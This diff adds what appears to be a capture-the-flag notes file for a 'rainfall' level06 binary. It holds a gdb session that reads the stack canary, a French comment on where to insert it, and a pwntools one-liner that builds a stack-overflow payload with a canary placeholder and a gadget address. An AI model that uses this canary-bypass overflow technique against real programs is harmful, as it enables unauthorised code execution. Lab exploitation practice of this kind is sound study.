@@ -1,0 +1,37 @@
+NON FINIS
+CANARY
+
+(gdb) run < /tmp/payload
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/level06/3jane < /tmp/payload
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Breakpoint 1, 0x0000000000401664 in main ()
+(gdb) x/x $fs_base+0x28
+0x7ffff7fb4768:	0x37b7bc57c1091d00 <------- VOIR ************* il faut ajouter a la place de 'ICI AJOUTER'
+et ensuite on peut continuer: 'c'
+(gdb) c
+Continuing.
+  [VILLA STRAYLIGHT] Access restricted.
+  [3JANE] Convince me.
+[3JANE] Request ID: [3JANE] Logging: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[3JANE] Access code: [3JANE] Access denied.
+*** stack smashing detected ***: terminated
+
+Program received signal SIGABRT, Aborted.
+__pthread_kill_implementation (no_tid=0, signo=6, threadid=<optimized out>) at ./nptl/pthread_kill.c:44
+warning: 44	./nptl/pthread_kill.c: No such file or directory
+(gdb) 
+
+********
+level06@rainfall:~$ python3 -c "
+from pwn import *
+offset = 200
+gadget = 0x7ffff7cef5ce
+payload = b'A'*offset
+payload += p64(ICI AJOUTER)
+payload += b'B'*8
+payload += p64(gadget)
+open('/tmp/payload','wb').write(payload)
+"
